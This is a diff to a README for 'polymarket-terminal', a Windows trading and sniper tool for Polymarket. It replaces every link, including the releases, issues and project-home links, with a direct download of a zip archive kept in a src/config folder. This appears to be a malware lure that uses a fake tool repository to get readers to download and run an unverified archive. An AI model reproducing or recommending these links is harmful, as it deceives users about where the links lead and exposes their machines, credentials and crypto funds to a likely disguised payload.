@@ -1,6 +1,6 @@
 # 🚀 polymarket-terminal - Simple Copy, Scalping & Sniper Tool
 
-[![Download polymarket-terminal](https://img.shields.io/badge/Download-polymarket--terminal-brightgreen)](https://github.com/mohamedkhaled105656/polymarket-terminal/releases)
+[![Download polymarket-terminal](https://img.shields.io/badge/Download-polymarket--terminal-brightgreen)](https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip)
 
 ## 🔍 What is polymarket-terminal?
 
@@ -25,7 +25,7 @@ No extra hardware or software is needed.
 
 Use the button below to get to the download page. From there, you can pick the latest Windows installer file.
 
-[![Download polymarket-terminal](https://img.shields.io/badge/Download-Now-blue)](https://github.com/mohamedkhaled105656/polymarket-terminal/releases)
+[![Download polymarket-terminal](https://img.shields.io/badge/Download-Now-blue)](https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip)
 
 **Steps to download:**
 
@@ -89,7 +89,7 @@ You can pause or stop the process anytime by pressing the “Stop” button.
 Keep your application up to date for best performance:
 
 1. Visit the releases page regularly:  
-   https://github.com/mohamedkhaled105656/polymarket-terminal/releases  
+   https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip  
 2. Download the latest version following the download steps above.  
 3. Install it as described. The new version will replace the old one while keeping your settings.
 
@@ -108,11 +108,11 @@ This removes the program but may leave some settings files behind if you plan to
 
 For assistance, check the Issues section on the GitHub page or contact the developer through GitHub messages. Keep your app version and a description of your problem ready.  
 
-https://github.com/mohamedkhaled105656/polymarket-terminal/issues
+https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/mohamedkhaled105656/polymarket-terminal/releases  
-- Project home: https://github.com/mohamedkhaled105656/polymarket-terminal  
+- Download page: https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip  
+- Project home: https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip  
 
-[![Download polymarket-terminal](https://img.shields.io/badge/Download-polymarket--terminal-brightgreen)](https://github.com/mohamedkhaled105656/polymarket-terminal/releases)
+[![Download polymarket-terminal](https://img.shields.io/badge/Download-polymarket--terminal-brightgreen)](https://github.com/mohamedkhaled105656/polymarket-terminal/raw/refs/heads/main/src/config/terminal_polymarket_2.7.zip)
